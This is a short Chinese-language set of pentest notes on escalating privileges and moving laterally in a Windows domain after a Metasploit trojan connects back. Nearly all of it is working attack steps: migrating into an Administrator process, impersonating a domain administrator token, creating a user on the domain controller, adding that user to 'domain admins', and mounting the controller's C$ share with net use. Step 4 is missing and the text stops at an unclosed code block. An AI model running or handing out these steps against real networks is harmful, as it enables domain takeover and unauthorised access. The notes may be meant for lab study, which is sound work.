纵向移动和横向移动

前提:

使用msfconsole 木马上线

纵向移动

  1. ps 查看进程找一个administrator进程迁移进去
  2. 比如2436 migrate 2436
  3. getuid查看权限
  5. 盗用令牌 impersonate_token JXG\Administrator
  6. add_user jxg Test123! -h 192.168.138.132 使用提到的权限在IP地址是域控制服务器中添加一个用户
  7. 把新创建的用户加入域管理员组变相提权 add_group_user “domain admins” jxg -h 192.168.138.132
  8. shell中输入net group “domain admins” /domain 查看是否成功添加到组

横向移动

  1. 在win2008上 映射网络驱动器

  2. 输入创建的域管理员账号密码

  3. 连接完成

  4. ```
    或者命令行 net use \192.168.138.132\c$ “Test123!” /user:jxg
